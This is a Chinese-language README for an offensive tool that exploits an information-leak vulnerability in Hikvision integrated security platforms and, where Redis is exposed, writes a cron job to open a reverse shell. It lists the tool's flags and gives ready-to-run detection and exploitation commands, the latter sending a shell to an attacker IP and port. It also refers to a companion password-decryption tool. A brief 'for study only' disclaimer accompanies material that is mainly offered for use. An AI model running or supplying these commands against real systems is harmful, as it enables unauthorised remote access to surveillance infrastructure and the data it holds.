# 海康威视综合安防信息泄露工具

## 简介

*该工具用于海康威视信息泄露漏洞的检测，若目标redis对外开放会结合redis写入计划任务反弹shell。*

本工具只做学习交流用，代码开源，请勿用做违法用途。

## 使用

 **参数**

```shell
  -c	check is vuln(default)
  -e	reverse a shell
  -p string
    	reverse port
  -r string
    	reverse  ip
  -u string
    	target url
```

**检测**

```shell
./Hikvision_Info_Leak -c -u http://xxxx.xx.xxx.xx
```

**利用**

```shell
./Hikvision_Info_Leak -e -u http://xxxx.xx.xxx.xx -r x.x.x.x -p 18080
```

## 注意

1.本工具的利用模块需要结合海康密码解密工具

https://github.com/wafinfo/Hikvision